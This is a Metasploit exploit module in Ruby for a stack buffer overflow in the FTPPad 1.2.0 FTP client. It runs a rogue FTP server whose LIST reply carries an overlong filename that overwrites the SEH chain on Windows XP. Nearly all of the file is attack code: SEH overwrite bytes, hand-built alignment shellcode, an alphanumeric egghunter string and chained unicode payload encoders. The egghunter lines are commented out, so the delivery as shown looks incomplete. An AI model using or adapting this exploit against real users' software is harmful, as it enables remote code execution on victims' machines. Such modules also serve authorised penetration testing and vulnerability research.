##
# $Id: ftppad_list_reply.rb 12196 2011-04-01 00:51:33Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Exploit::Remote::FtpServer
	#include Msf::Exploit::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FTPPad 1.2.0 Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow FTPPad 1.2.0 ftp client. The overflow is
				triggered when the client connects to a FTP server which sends an overly long directory
				and filename in response to a LIST command.

				This will cause an access violation, and will eventually overwrite the saved extended
				instruction pointer.  Payload can be found at EDX+5c and ESI+5c, so a little pivot/
				sniper was needed to make this one work.
			},
			'Author' 	 =>
				[
					'corelanc0d3r'
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 12196 $",
			'References'     =>
				[
					[ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 7000,
					'BadChars' => "\x00\x0a\x0f\x0d",
					'DisableNops' => true,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Universal', { 'Ret' => "\x45\x5B", 'Offset' => 1746 } ],
								],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 12 2010',
			'DefaultTarget'  => 0))

	end

	def setup
		super
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_list(c,arg)
		conn = establish_data_connection(c)
		if(not conn)
			c.put("425 Can't build data connection\r\n")
			return
		end
		print_status(" - Data connection set up")
		code = 150
		c.put("#{code} Here comes the directory listing.\r\n")
		code = 226
		c.put("#{code} Directory send ok.\r\n")
		totalsize = 5000
		
		# 61               POPAD
		# 0062 00          ADD BYTE PTR DS:[EDX],AH
		nseh = "\x61\x62"
		# 45               INC EBP
		# 005B 00          ADD BYTE PTR DS:[EBX],BL
		seh = target['Ret']
		
		#align		
		# 60               PUSHAD
		# 0073 00          ADD BYTE PTR DS:[EBX],DH
		align = "\x60"
		align << "\x73"
		# 53               PUSH EBX
		# 0073 00          ADD BYTE PTR DS:[EBX],DH
		align << "\x53"
		align << "\x73"
		# 58               POP EAX
		# 0073 00          ADD BYTE PTR DS:[EBX],DH
		align << "\x58"
		align << "\x73"
		# 05 00020011      ADD EAX,11000200
		# 0073 00          ADD BYTE PTR DS:[EBX],DH
		align << "\x05\x02\x11"
		align << "\x73"
		# 2D 00010011      SUB EAX,11000100
		# 0073 00          ADD BYTE PTR DS:[EBX],DH
		align << "\x2d\x01\x11"
		align << "\x73"
		# 50               PUSH EAX
		# 0073 00          ADD BYTE PTR DS:[EBX],DH
		# 5C		   POP ESP
		# 0073 00          ADD BYTE PTR DS:[EBX],DH
		# 54		   PUSH ESP
		# 0073 00          ADD BYTE PTR DS:[EBX],DH
		# C3               RETN
		align << "\x50\x73\xc3"	
		
		egg = '0t0t'
		hunter = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA"
		hunter << "58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB36CQ7ZKPKPORPR2JM2PXXMNNOLKUQJRT"
		hunter << "ZOVXKPNPM0RT4KKJ6ORUZJFO2U9WKOZGA"
		
		safechar = "\x73"
		align2 = "\x73\x57\x73\x58\x73"	#nop/push edi/nop/pop eax/nop
		align2 << "\xb9\x1b\xaa"	#mov ecx,0xaa001b00
		align2 << "\xe8\x73"		#add al,ch + nop
		align2 << "\x50\x73\xc3"	#push eax,nop,ret
	
		#egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })
		sc = payload.encoded + payload_badchars
		#hunter, egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })

		# Encode with alphamixed, then unicode mixed
		[ 'x86/alpha_mixed', 'x86/unicode_upper' ].each { |name|
			enc = framework.encoders.create(name)
			if name =~ /unicode/
				enc.datastore.import_options({ 'BufferRegister' => 'EAX' })
			else
				enc.datastore.import_options({ 'BufferRegister' => 'EDX' })
			end
			# NOTE: we already eliminated badchars
			sc = enc.encode(sc, nil, nil, platform)
			if name =~/alpha/
				#insert getpc_stub & align EDX, unicode encoder friendly.
				#Hardcoded stub is not an issue here because it gets encoded anyway
				#getpc_stub = "\x89\xe1\xdb\xcc\xd9\x71\xf4\x5a\x83\xc2\x41\x83\xea\x35"
				sc = align2 + sc
			end
		}
		#tweak hunter, patched to make it write to ECX
		sc[1] = "a"
		
		adjust1 = "A" * 106
		adjust2 = rand_text_alpha_upper(944)
		
		filename = rand_text_alpha_upper(target['Offset'])
		filename << nseh << seh
		filename << align
		filename << adjust1 + safechar
		#filename << hunter
		#filename << adjust2
		#filename << egg << sc
		filename << "D" * (totalsize - filename.length)
		print_status(" - Sending file list via data connection")
		dirlist = "-rwxrwxrwx    1 100      0         11111 Jun 11 21:10 #{filename}.txt\r\n"
		dirlist << "drwxrwxrwx    1 100      0         11111 Jun 11 21:10 #{filename}\r\n"
		dirlist << "-rwxrwxrwx    1 100      0         11111 Jun 11 21:10 #{filename}.txt\r\n"
		conn.put(dirlist)
		conn.close
		print_status(" - Payload sent, wait for hunter...")
		return
	end

end